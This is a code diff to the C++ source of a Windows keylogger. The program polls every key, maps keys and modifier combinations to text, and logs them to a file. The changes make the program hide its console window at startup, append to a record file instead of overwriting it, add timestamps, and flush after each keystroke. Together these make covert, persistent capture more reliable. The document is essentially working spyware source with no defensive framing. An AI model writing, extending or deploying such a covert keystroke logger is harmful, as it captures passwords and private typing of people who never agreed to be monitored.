@@ -2,6 +2,7 @@
 #include <string>
 #include <locale>
 #include <vector>
+#include <ctime>
 
 #include <conio.h>
 #include <windows.h>
@@ -19,15 +20,33 @@ void stealth_mode()
     ShowWindow(stealth, 0);
 }
 
+void print_time()
+{
+    time_t curr_time;
+	tm * curr_tm;
+	char temp[100];
+
+	time(&curr_time);
+	curr_tm = gmtime(&curr_time);
+
+	strftime(temp, 100, "%d/%m/%Y %H:%M:%S", curr_tm);
+
+    wchar_t str[100];
+    for(int i = 0; i < 100; i++) str[i] = temp[i];
+    std::wstring time_string(str);
+    std::wstring print_string = SEPERATOR;
+    print_string += L"Time: ";
+    print_string += time_string;
+    print_string += SEPERATOR;
+    print_string += L'\n';
+    std::wcout << print_string << std::flush;
+}
+
 int get_keyboard_layout_code()
 {
     CHAR temp[KL_NAMELENGTH+5];
     GetKeyboardLayoutNameA(temp);
-    // wcout << temp << endl;
-
     std::string s(temp);
-    // wcout << s << endl;
-
     int code = std::stoi(s, nullptr, 16);
     return code;
 }
@@ -58,29 +77,29 @@ std::wstring key_to_string_plain(DWORD key)
 {
     if(key >= 0x70 && key <= 0x87) // F key
     {
-        std::wstring s = L"F";
+        std::wstring s = FKEY_PREFIX;
         s += std::to_wstring(key-111);
         return s;
     }
     switch(key)
     {
-        case VK_SPACE: return L"space";
-        case VK_LBUTTON: return L"mouseleft";
-        case VK_RBUTTON: return L"mouseright";
-        case VK_MBUTTON: return L"mousemid";
-        case VK_RETURN: return L"\n";
-        case VK_BACK: return L"backspace";
-        case VK_TAB: return L"tab";
-        case VK_ESCAPE: return L"esc";
-        case VK_INSERT: return L"ins";
-        case VK_DELETE: return L"del";
-        case VK_LEFT: return L"leftarrow";
-        case VK_UP: return L"uparrow";
-        case VK_RIGHT: return L"rightarrow";
-        case VK_DOWN: return L"downarrow";
-        case VK_SNAPSHOT: return L"printscreen";
-        case VK_APPS: return L"apps";
-        case VK_SLEEP: return L"sleep";
+        case VK_SPACE: return VK_SPACE_STR;
+        case VK_LBUTTON: return VK_LBUTTON_STR;
+        case VK_RBUTTON: return VK_RBUTTON_STR;
+        case VK_MBUTTON: return VK_MBUTTON_STR;
+        case VK_RETURN: return VK_RETURN_STR;
+        case VK_BACK: return VK_BACK_STR;
+        case VK_TAB: return VK_TAB_STR;
+        case VK_ESCAPE: return VK_ESCAPE_STR;
+        case VK_INSERT: return VK_INSERT_STR;
+        case VK_DELETE: return VK_DELETE_STR;
+        case VK_LEFT: return VK_LEFT_STR;
+        case VK_UP: return VK_UP_STR;
+        case VK_RIGHT: return VK_RIGHT_STR;
+        case VK_DOWN: return VK_DOWN_STR;
+        case VK_SNAPSHOT: return VK_SNAPSHOT_STR;
+        case VK_APPS: return VK_APPS_STR;
+        case VK_SLEEP: return VK_SLEEP_STR;
         default: return standard_key_to_wstring(key);
     }
 }
@@ -90,7 +109,7 @@ std::wstring key_to_string(DWORD key)
     if(key == VK_SPACE) return L" ";
 
     std::wstring temp = key_to_string_plain(key);
-    if(temp.size() > 1) return L'$' + temp + L'$';
+    if(temp.size() > 1) return SEPERATOR + temp + SEPERATOR;
     else return temp;
 }
 
@@ -113,14 +132,30 @@ std::wstring read_key_default(DWORD key)
     if(s.empty()) return L"";
 
     std::wstring prefix = L"";
-    if(shift) prefix += L"shift ";
-    if(ctrl) prefix += L"ctrl ";
-    if(alt) prefix += L"alt ";
-    if(super) prefix += L"super ";
+    if(shift)
+    {
+        prefix += MODE_SHIFT_STR;
+        prefix += COMBINATION_SEPERATOR;
+    }
+    if(ctrl)
+    {
+        prefix += MODE_CTRL_STR;
+        prefix += COMBINATION_SEPERATOR;
+    }
+    if(alt)
+    {
+        prefix += MODE_ALT_STR;
+        prefix += COMBINATION_SEPERATOR;
+    }
+    if(super)
+    {
+        prefix += MODE_SUPER_STR;
+        prefix += COMBINATION_SEPERATOR;
+    }
 
     if(ctrl || alt || super)
     {
-        std::wstring temp = L'$' + prefix + s + L'$';
+        std::wstring temp = SEPERATOR + prefix + s + SEPERATOR;
         return temp;
     }
     else if(is_letter(s))
@@ -130,7 +165,7 @@ std::wstring read_key_default(DWORD key)
     }
     else if(shift)
     {
-        std::wstring temp = L'$' + prefix + s + L'$';
+        std::wstring temp = SEPERATOR + prefix + s + SEPERATOR;
         return temp;
     }
     else return key_to_string(key);
@@ -235,12 +270,18 @@ std::vector<int> generate_key_list()
 
 int main()
 {
-    freopen("output.txt", "w", stdout);
+    stealth_mode();
+
+    freopen(RECORD_FILE, "a", stdout);
     
     _setmode(_fileno(stdout), _O_U16TEXT);
 
-    int kbcode = get_keyboard_layout_code();
-    wprintf(L"$kbcode: %x$\n", kbcode);
+    std::wcout << START_STR << std::flush;
+    print_time();
+
+    int keyboardLayoutCode = get_keyboard_layout_code();
+    wprintf(L"%skeyboardLayoutCode: %x%s\n", SEPERATOR, keyboardLayoutCode, SEPERATOR);
+    fflush(stdout);
     std::vector<int> keyList = generate_key_list();
     while(true)
     {
@@ -249,9 +290,9 @@ int main()
             if(GetAsyncKeyState(key) == -32767)
             {
                 std::wstring result;
-                if(kbcode == 0x41f) result = read_key_tr(key);
+                if(keyboardLayoutCode == LAYOUTCODE_TR) result = read_key_tr(key);
                 else result = read_key_default(key);
-                std::wcout << result;
+                std::wcout << result << std::flush;
             }
         }
     }
